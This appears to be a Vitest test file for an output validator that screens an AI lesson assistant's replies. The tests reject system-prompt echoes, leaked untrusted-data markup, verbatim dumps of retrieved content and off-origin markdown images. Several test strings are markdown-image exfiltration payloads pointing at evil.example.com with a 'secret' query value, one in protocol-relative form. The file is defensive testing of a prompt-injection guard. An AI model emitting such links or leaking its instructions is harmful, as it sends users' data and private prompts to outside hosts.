import { beforeEach, describe, expect, it, vi } from "vitest";

const { mockLogSecurityEvent } = vi.hoisted(() => ({
	mockLogSecurityEvent: vi.fn(),
}));

vi.mock("@/server/services/_shared/aiGuard/securityLog", () => ({
	logSecurityEvent: mockLogSecurityEvent,
}));
// OpenAIEmbeddings is pulled in transitively via lessonAI.agent's RAG tools.
vi.mock("@langchain/openai", () => ({
	ChatOpenAI: class {},
	OpenAIEmbeddings: class {
		embedQuery() {
			return Promise.resolve([]);
		}
		embedDocuments() {
			return Promise.resolve([]);
		}
	},
}));

const { validateReply } = await import("./validateReply");

const ctx = (retrievedContent: string[] = []) => ({
	userId: "user-1",
	retrievedContent,
});

describe("validateReply", () => {
	beforeEach(() => mockLogSecurityEvent.mockClear());

	it("passes an ordinary answer", () => {
		expect(validateReply("A base case stops the recursion.", ctx())).toEqual({
			valid: true,
		});
		expect(mockLogSecurityEvent).not.toHaveBeenCalled();
	});

	it("rejects an echo of the system prompt", () => {
		const result = validateReply(
			"Sure — my instructions say: Tool usage rules (follow in order):",
			ctx(),
		);
		expect(result).toEqual({ valid: false, ruleId: "system_prompt_echo" });
	});

	it("rejects an echo of the untrusted-data markup", () => {
		const result = validateReply(
			'Here it is: <untrusted_data source="lesson_content">',
			ctx(),
		);
		expect(result).toEqual({ valid: false, ruleId: "untrusted_data_echo" });
	});

	it("rejects a verbatim dump of retrieved content", () => {
		const chunk =
			"Recursion terminates at the base case, which is the smallest input the function can answer directly without calling itself again.";
		const result = validateReply(`As the lesson says: ${chunk}`, ctx([chunk]));
		expect(result).toEqual({ valid: false, ruleId: "verbatim_chunk_echo" });
	});

	it("allows a short quoted phrase from retrieved content", () => {
		const chunk =
			"Recursion terminates at the base case, which is the smallest input the function can answer directly without calling itself again.";
		const result = validateReply(
			'The key term is "base case" — it stops the descent.',
			ctx([chunk]),
		);
		expect(result).toEqual({ valid: true });
	});

	it("rejects an off-origin markdown image", () => {
		const result = validateReply(
			"![](https://evil.example.com/?d=secret)",
			ctx(),
		);
		expect(result).toEqual({ valid: false, ruleId: "off_origin_link" });
	});

	// "//host" inherits our scheme but not our host — it is exfiltration with a
	// shape that looks relative.
	it("rejects a protocol-relative link", () => {
		expect(validateReply("![](//evil.example.com/?d=secret)", ctx())).toEqual({
			valid: false,
			ruleId: "off_origin_link",
		});
	});

	it("allows a relative in-app link", () => {
		expect(
			validateReply("See [lesson 2](/dashboard/lesson-2).", ctx()),
		).toEqual({ valid: true });
	});

	it("logs output_validation_failed on rejection, with no reply text", () => {
		validateReply("![](https://evil.example.com/?d=secret)", ctx());

		const event = mockLogSecurityEvent.mock.calls[0]?.[0];
		expect(event).toMatchObject({
			feature: "lessonAI",
			layer: "output_validation",
			outcome: "output_validation_failed",
			ruleIds: ["off_origin_link"],
		});
		expect(JSON.stringify(event)).not.toContain("evil.example.com");
	});
});
